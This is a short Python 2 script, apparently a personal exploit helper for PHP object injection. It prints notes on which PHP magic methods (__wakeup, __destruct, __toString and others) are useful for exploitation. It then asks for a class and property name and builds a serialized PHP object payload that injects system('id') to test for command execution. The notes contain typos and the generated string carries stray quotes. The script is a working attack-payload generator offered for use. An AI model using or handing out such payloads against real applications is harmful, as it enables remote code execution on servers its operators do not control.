print('''
the thing which is written in front of class is called as object in which you have to find a varibale getting evaluated or getting called by the
function some of the function for which should look for to exploit this bug in the phpfile are some of the bellow.

Magic Methods most useful for exploitation
__toString() - Invoked when object is converted to a string. (by echo for example)
__destruct() - Invoked when an object is deleted. When no reference to the deserialized object instance exists, __destruct() is called.
__wakeup() - Invoked when an object is unserialized. automatically called upon object deserialization.
__call() - will be called if the object will ca1ll an inexistent function

Magic Methods that could be useful for exploitation (Not useful in Most Cases)
__set() - called if the object try to access inexistent class variables
__isset()
__invoke()
__unset()
__set_state()
__callStatic()
__sleep() - called when an object is serialized (with serialize)
__clone()
__get() - called if the object try to access inexistent class variables
__debugInfo()
__construct() - Invoked when an object is created (constructor)

''')
input_object = raw_input("--ObjectName--> ")
input_variable = raw_input("--VariableName---> ")
len_object = len(input_object)
len_variable = len(input_variable)
output = '''"O:'''+str(len_object)+''':"'''+input_object+'''":1:{s:'''+str(len_variable)+''':"'''+input_variable+'''";s:13:"system('id');";}"'''
print(output)
